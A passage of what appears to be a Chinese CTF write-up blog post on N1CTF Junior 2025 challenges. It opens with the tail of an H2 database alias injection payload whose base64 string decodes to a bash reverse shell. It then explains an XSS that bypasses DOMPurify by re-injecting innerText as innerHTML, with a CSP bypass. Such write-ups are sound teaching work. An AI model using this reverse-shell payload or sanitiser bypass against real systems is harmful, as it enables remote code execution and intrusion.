punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"YmFzaCAtaSA%2bJiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA%2bJjE="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>$$<span class="token punctuation">;</span> <span class="token class-name">CALL</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span></code></pre>
+
+
+<p>这样就可以顺利拿到shell了。  </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ArcherCY/p/17699288.html">参考</a><br><a target="_blank" rel="noopener" href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">还有稍微更详细的</a>  </p>
+<p>之后就进行读取即可。  </p>
+<h2 id="5-dispaly"><a href="#5-dispaly" class="headerlink" title="5.dispaly"></a>5.dispaly</h2><p>源码还是比较少的，很容易看。  </p>
+<p>通过bot这个东西很容易看出来这是一个xss，所有的关键代码在index.js中。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getQueryParam</span><span class="token punctuation">(</span><span class="token parameter">param</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// Sanitize content using DOMPurify</span>
+<span class="token keyword">function</span> <span class="token function">sanitizeContent</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// Only allow &lt;h1>, &lt;h2>, tags and plain text</span>
+    <span class="token keyword">const</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token constant">ALLOWED_TAGS</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'h1'</span><span class="token punctuation">,</span> <span class="token string">'h2'</span><span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"DOMContentLoaded"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> textInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'text-input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> insertButton <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'insert-btn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> contentDisplay <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'content-display'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">const</span> queryText <span class="token operator">=</span> <span class="token function">getQueryParam</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>queryText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> sanitizedText <span class="token operator">=</span> <span class="token function">sanitizeContent</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token function">decodeURI</span><span class="token punctuation">(</span>queryText<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>sanitizedText<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            textInput<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> sanitizedText<span class="token punctuation">;</span>             <span class="token comment">// 写入预览区</span>
+            contentDisplay<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> textInput<span class="token punctuation">.</span>innerText<span class="token punctuation">;</span>  <span class="token comment">// 写入效果显示区</span>
+
+            insertButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            textInput<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">"Only allow h1, h2 tags and plain text"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>app中有csp头:</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> csp <span class="token operator">=</span> <span class="token string">"script-src 'self'; object-src 'none'; base-uri 'none';"</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> csp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>可以看到这里使用了白名单，只允许<code>[&#39;h1&#39;, &#39;h2&#39;]</code>，而不允许其他标签。</p>
+<blockquote>
+<p>其实一个白名单就基本能防住了,但是后面代码乱搞使xss可以成功.  </p>
+</blockquote>
+<p><code>contentDisplay.innerHTML = textInput.innerText;</code><br>这就是漏洞的核心,这里发生了两件事：<br><code>textInput.innerText</code>: 这是一个关键的属性。它会获取一个DOM元素被渲染后的纯文本内容。它会把所有的HTML标签都剥离掉。例如，如果textInput的内容是<code>&lt;h1&gt;Hello &lt;b&gt;World&lt;/b&gt;&lt;/h1&gt;</code>，那么textInput.innerText返回的就是字符串”Hello World”。<br><code>contentDisplay.innerHTML = ...</code>: 然后，代码将这个纯文本字符串，又一次当作HTML代码重新注入到了另一个元素contentDisplay中。  </p>
+<p>这个逻辑缺陷创造了一个“绕过净化”的机会：如果我们能构造一个输入，使得它经过DOMPurify净化后，其.innerText的内容恰好是一段恶意的HTML代码，那么当这段内容被重新赋给innerHTML时，XSS就会被触发。  </p>
+<p>这里实测下来虽然能成功上传,但是并不能被执行.  </p>
+<p>这是因为内容是动态放置在 &lt;div&gt; 内的，并且由于使用了innerHTML，因此脚本没有执行。这里主要的利用点在contentDisplay，通过将contentDisplay.innerHTML设置为一个正常的html标签，然后插入到DOM树中。  </p>
+<p>这里我们使用Iframe绕过绕过csp  </p>
+<p>现在就是CSP绕过了，script-src设置为了self。这个就是sekaictf 2024的熟悉操作了，这里直接利用404页面构造即可，还是那个操作，本地引用，前面闭合成多行注释符，后面直接的那行注释掉，留一个完整的js代码，还是用fetch()函数  </p>
+<p>这里wp用反弹shell,<a target="_blank" rel="noopener" href="https://fupanc-w1n.github.io/p/n1ctf-junior-2025/#display">可以看看</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://infernity.top/2025/02/12/N1CTF2025/">更详细的一个</a></p>
+<p>最后可以拿到flag.</p>
+
+  </div>
+
+  <nav class="post_nav" aria-label="文章导航">
+    
+    <a class="post_nav_item" href="/RCTF%E5%A4%8D%E7%8E%B0/"
+       data-magnetic data-stroke data-cursor="上一篇">
+      <span class="post_nav_label">上一篇</span>
+      <span class="post_nav_title">RCTF复现</span>
+    </a>
+    
+    
+    <a class="post_nav_item post_nav_item--next" href="/%E5%85%B3%E4%BA%8E%E9%98%9F%E5%86%85%E7%A7%AF%E5%88%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B5%8B%E8%AF%95/"
+       data-magnetic data-stroke data-cursor="下一篇">
+      <span class="post_nav_label">下一篇</span>
+      <span class="post_nav_title">积分榜session伪造越权漏洞</span>
+    </a>
+    
+  </nav>
+
+  <p class="post_back">
+    <a href="/tags/" data-magnetic data-stroke data-cursor="全部文章">
+      <svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4.6 12h14.2"/><path d="m13 6.2 5.8 5.8-5.8 5.8"/></svg><span>按标签浏览全部文章</span>
+    </a>
+  </p>
+</article>
+
+    </main>
+
+    <footer class="site_footer">
+  <p class="site_footer_copy">
+    &copy; 2026 祈染安 &middot; 安的角落
+  </p>
+  <p class="site_footer_license">
+    <a href="/about/" data-cursor="关于">关于</a>
+    &middot;
+    <a href="/feed.xml" data-cursor="订阅">RSS</a>
+    &middot;
+    <a target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="license noopener">CC BY-NC 4.0</a>
+  </p>
+</footer>
+
+
+    <!-- 动画依赖全部本地化，不依赖任何 CDN -->
+    <script src="/js/vendor/gsap.min.js"></script>
+    <script src="/js/vendor/ScrollTrigger.min.js"></script>
+    <script src="/js/vendor/CustomEase.min.js"></script>
+    <script src="/js/vendor/SplitText.min.js"></script>
+    <script src="/js/vendor/lenis.min.js"></script>
+    <script src="/js/frontend.js"></script>
+  </body>
+</html>
